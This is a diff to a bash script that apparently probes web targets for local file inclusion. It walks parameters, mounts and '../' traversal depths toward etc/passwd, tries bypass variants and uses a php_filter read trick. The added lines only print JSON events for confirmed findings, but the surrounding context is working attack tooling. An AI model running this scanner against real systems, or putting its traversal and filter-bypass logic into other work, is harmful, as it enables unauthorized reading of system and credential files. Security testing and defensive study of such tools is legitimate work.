@@ -80,6 +80,7 @@ for mount in $MOUNTS; do
     if try_lfi "$URL" "ABS mount=$mount param=$param"; then
       echo "LFI_FOUND:$param:0:absolute"
       echo "LFI_MOUNT:$mount"
+      echo "{\"event\":\"lfi_param_found\",\"payload\":{\"param\":\"$param\",\"depth\":0,\"style\":\"absolute\",\"confirmed\":true}}"
       exit 0
     fi
   done
@@ -94,6 +95,7 @@ for mount in $MOUNTS; do
       if try_lfi "$URL" "REL mount=$mount depth=$depth param=$param"; then
         echo "LFI_FOUND:$param:$depth:relative"
         echo "LFI_MOUNT:$mount"
+        echo "{\"event\":\"lfi_param_found\",\"payload\":{\"param\":\"$param\",\"depth\":$depth,\"style\":\"relative\",\"confirmed\":true}}"
         exit 0
       fi
     done
@@ -112,8 +114,9 @@ for depth in 1 2 3 4 5 6 7 8 9 10; do
   TRAV=$(printf '../%.0s' $(seq 1 $depth))
   for kpath in $RECON_PATHS; do
     URL="$BASE${kpath}${TRAV}etc/passwd"
-    if try_lfi "$URL" "KPATH kpath=$kpath depth=$depth"; then
+      if try_lfi "$URL" "KPATH kpath=$kpath depth=$depth"; then
       echo "LFI_PATH_FOUND:$kpath:$depth"
+      echo "{\"event\":\"lfi_param_found\",\"payload\":{\"path\":\"$kpath\",\"depth\":$depth,\"style\":\"relative\",\"confirmed\":true}}"
       exit 0
     fi
   done
@@ -142,6 +145,7 @@ for mount in $MOUNTS; do
         if try_lfi "$URL" "BYPASS mount=$mount depth=$depth param=$param bypass=$bypass"; then
           echo "LFI_BYPASS_FOUND:$param:$depth:$bypass"
           echo "LFI_MOUNT:$mount"
+          echo "{\"event\":\"lfi_param_found\",\"payload\":{\"param\":\"$param\",\"depth\":$depth,\"style\":\"bypass\",\"bypass\":\"$bypass\",\"confirmed\":true}}"
           exit 0
         fi
       done
@@ -199,6 +203,7 @@ for mount in $MOUNTS; do
         echo "$decoded" | head -5
         echo "LFI_FOUND:$param:0:php_filter"
         echo "LFI_MOUNT:$mount"
+        echo "{\"event\":\"lfi_param_found\",\"payload\":{\"param\":\"$param\",\"depth\":0,\"style\":\"php_filter\",\"confirmed\":true}}"
         exit 0
       fi
       echo "[$PROBE_COUNT][MISS] FILTER mount=$mount param=$param target=$target exit=$ec size=${sz}B"
